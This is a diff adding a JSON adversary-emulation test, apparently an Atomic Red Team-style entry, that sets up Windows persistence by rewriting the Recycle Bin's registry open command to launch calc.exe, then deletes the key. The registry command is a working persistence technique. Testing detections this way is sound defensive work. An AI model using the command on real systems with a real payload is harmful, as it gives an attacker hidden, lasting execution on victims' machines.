@@ -1,0 +1,44 @@
+{
+  "id": "bda6a3d6-7aa7-4e89-908b-306772e9662f",
+  "name": "Add persistance via Recycle bin",
+  "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "021b4ed6-0ade-4622-99ce-b43c3d78661e",
+      "type": "execute-command",
+      "data": {
+        "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "10b97394-df6f-478d-97e8-015b149bbe1a",
+      "type": "execute-command",
+      "data": {
+        "command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "021b4ed6-0ade-4622-99ce-b43c3d78661e",
+      "p": "on-success",
+      "o": "10b97394-df6f-478d-97e8-015b149bbe1a"
+    },
+    {
+      "s": "021b4ed6-0ade-4622-99ce-b43c3d78661e",
+      "p": "on-failure",
+      "o": "10b97394-df6f-478d-97e8-015b149bbe1a"
+    }
+  ],
+  "tags": [
+    "T1547.001",
+    "atomic-red-team"
+  ]
+}
